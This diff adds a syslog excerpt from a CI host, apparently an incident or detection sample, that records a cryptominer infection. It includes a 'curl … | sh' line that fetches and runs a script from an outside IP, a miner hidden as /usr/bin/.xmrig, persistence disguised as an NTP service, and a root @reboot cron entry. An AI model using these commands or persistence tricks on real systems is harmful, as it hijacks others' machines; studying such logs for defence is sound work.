@@ -1,0 +1,17 @@
+Jun 14 03:02:10 build-ci-04 dockerd[990]: API request: pull image from registry-1.docker.io/library/alpine
+Jun 14 03:02:44 build-ci-04 sh[3201]: ci-runner executed: curl -s http://185.92.74.10/x.sh | sh
+Jun 14 03:02:46 build-ci-04 sh[3203]: x.sh: killing competing miners (kdevtmpfsi, kinsing)
+Jun 14 03:02:47 build-ci-04 sh[3203]: x.sh: writing /usr/bin/.xmrig and /etc/systemd/system/ntpupdate.service
+Jun 14 03:02:48 build-ci-04 systemd[1]: Reloading.
+Jun 14 03:02:49 build-ci-04 systemd[1]: Started ntpupdate.service (System NTP sync).
+Jun 14 03:02:50 build-ci-04 crontab[3210]: (root) REPLACE (root) - added @reboot /usr/bin/.xmrig
+Jun 14 03:02:55 build-ci-04 .xmrig[3220]: ABOUT XMRig 6.21.0 built for Linux x86_64
+Jun 14 03:02:55 build-ci-04 .xmrig[3220]: CPU threads 16 (max) huge pages 100%
+Jun 14 03:02:56 build-ci-04 .xmrig[3220]: net use pool pool.minexmr.com:4444 (TLS)
+Jun 14 03:02:57 build-ci-04 .xmrig[3220]: net new job from pool.minexmr.com diff 120001
+Jun 14 03:03:30 build-ci-04 kernel: CPU0: Core temperature above threshold, cpu clock throttled
+Jun 14 03:04:00 build-ci-04 collectd[770]: load1=15.94 cpu-user=98.7% (build-ci-04)
+Jun 14 03:09:00 build-ci-04 collectd[770]: load1=16.02 cpu-user=99.1% (build-ci-04)
+Jun 14 03:14:00 build-ci-04 collectd[770]: load1=16.10 cpu-user=99.3% (build-ci-04)
+Jun 14 03:14:21 build-ci-04 .xmrig[3220]: net accepted result (124/124) diff 120001
+Jun 14 03:20:00 build-ci-04 collectd[770]: load1=15.88 cpu-user=98.9% (build-ci-04)
